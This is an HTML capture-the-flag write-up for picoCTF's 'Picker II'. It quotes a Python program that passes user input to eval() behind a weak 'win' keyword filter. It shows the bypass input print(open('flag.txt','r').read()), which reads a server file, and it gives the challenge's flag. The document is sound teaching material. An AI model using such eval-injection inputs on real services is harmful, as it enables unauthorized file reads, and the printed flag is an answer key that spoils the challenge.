
<!DOCTYPE html>
<html>
<body>
<title>Picker II- picoGym Exclusive</title>

<h2>Challenge Description</h2>
<p> AUTHOR: LT 'SYREAL' JONES

Description
Can you figure out how this program works to get the flag?
Additional details will be available after launching your challenge instance.
------------------------------------------------------------------------------
Connect to the program with netcat:
$ nc saturn.picoctf.net 56676
The program's source code can be downloaded <a href="https://artifacts.picoctf.net/c/522/picker-II.py">here</a>.

</p>

<h2>Solution Approach</h2>
<p>Here are the steps we took to solve the challenge:</p>
<ol>
we download source and see is like <a href="https://phantom1ss.github.io/blog/2024/practice/picoctf/PickerI/writeup1.md">picker I </a>except that it has filter for prevent input win and get flag
<pre>
def filter(user_input):
if 'win' in user_input:
return False
return True


while(True):
try:
user_input = input('==> ')
if( filter(user_input) ):
eval(user_input + '()')
else:
print('Illegal input')
except Exception as e:
print(e)
</pre>
but like previous code can have input print('hi') all input should be like functions and can't have input like cat flag.txt
some inputs are like this<pre>
==> cat flag.txt
invalid syntax (<string>, line 1)
==> print('hi')
hi
'NoneType' object is not callable
==> exit
.....
</pre>
in hint say see what win function do.see win function code
<pre>
def win():
# This line will not work locally unless you create your own 'flag.txt' in
# the same directory as this script
flag = open('flag.txt', 'r').read()
#flag = flag[:-1]
flag = flag.strip()
str_flag = ''
for c in flag:
str_flag += str(hex(ord(c))) + ' '
print(str_flag)
</pre>
and this code that is like function and print flag is interested
<pre>
flag=open('flag.txt', 'r').read()
</pre>
so for print flag just input this and get flag
<pre>
==> print(open('flag.txt', 'r').read())
</pre>

</ol>
<br>
<h2>Flag</h2>
<p class="flag">picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}

<h2>Conclusion</h2>
<p>this is a very easy challenge for work on reverse engineering with python and bypass filter input</p>
</body>
</html>







